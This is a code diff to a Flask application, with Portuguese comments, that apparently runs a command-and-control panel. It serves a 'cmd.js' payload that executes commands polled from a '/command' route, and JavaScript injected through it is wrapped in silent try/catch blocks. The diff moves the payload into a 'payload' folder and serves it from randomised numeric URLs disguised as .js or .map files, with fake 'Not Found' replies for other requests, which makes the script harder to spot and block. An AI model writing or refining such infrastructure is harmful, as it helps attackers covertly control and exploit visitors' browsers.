@@ -73,7 +73,6 @@ def js_format_try_catch(js_code):
     if js_code:
         return f'try{{(function(){{{js_code}}}());}}catch(err){{}}'
 
-
 # Decorator para proteger rotas que exigem autenticação
 def login_required(f):
     """
@@ -391,16 +390,24 @@ def admin():
     """
     return render_template('admin-dashboard.html')
 
-@app.route('/js/cmd.js')
-def serve_cmd_js():
+@app.route('/<int:dinamic_id>/<dinamic_file>')
+def serve_payload_js(dinamic_file, dinamic_id):
     """
-    Serve o arquivo JavaScript do cliente com configuração de cache.
+    Serve arquivos JavaScript dinâmicos com configuração de cache.
     Este arquivo é responsável por verificar e executar os comandos recebidos.
     """
-    response = send_from_directory('static/js', 'cmd.js', mimetype='application/javascript')
+    # Verifica definição de dinamic_file e dinamic_id
+    if not dinamic_file and dinamic_id:
+        return jsonify({"error": "Not Found"}), 440
+    # Verifica extensão do arquivo
+    if not dinamic_file.endswith(('.js','.map')):
+        return jsonify({"error": "Not Found"}), 440
+    
+    response = send_from_directory('payload', 'cmd.js', mimetype='application/javascript')
     response.headers['Cache-Control'] = 'public, max-age=604800'
     return response
 
+# Rota para servir a biblioteca cliente do Socket.IO
 @app.route('/js/socket.io.min.js')
 def serve_socketio_js():
     """Rota para servir a biblioteca cliente do Socket.IO"""
@@ -408,25 +415,7 @@ def serve_socketio_js():
     response.headers['Cache-Control'] = 'public, max-age=604800'
     return response
 
-@app.route('/vendor/bootstrap/bootstrap.min.css')
-def serve_bootstrap_css():
-    """Rota alternativa para servir o CSS do Bootstrap"""
-    response = send_from_directory('static/vendor/bootstrap', 'bootstrap.min.css', mimetype='text/css')
-    response.headers['Cache-Control'] = 'public, max-age=604800'
-    return response
-
-@app.route('/vendor/bootstrap/bootstrap.min.css.map')
-def serve_bootstrap_css_map():
-    """Rota para o arquivo de source map do Bootstrap CSS (retorna 204 para evitar o erro 404)"""
-    # Retorna 204 No Content, pois o arquivo não existe mas é solicitado pelo navegador
-    return Response(status=204)
-
-@app.route('/vendor/bootstrap/bootstrap.bundle.min.js.map')
-def serve_bootstrap_js_map():
-    """Rota para o arquivo de source map do Bootstrap JS (retorna 204 para evitar o erro 404)"""
-    # Retorna 204 No Content, pois o arquivo não existe mas é solicitado pelo navegador
-    return Response(status=204)
-
+# Rota principal para o polling de comandos pelos clientes
 @app.route('/command')
 def get_command():
     """
@@ -596,6 +585,7 @@ if socketio_available:
 
 # Rota para teste do parser de User-Agent
 @app.route('/teste-user-agent')
+@login_required
 def teste_user_agent():
     """Página para testes do parser de User-Agent"""
     return render_template('teste-user-agent.html')
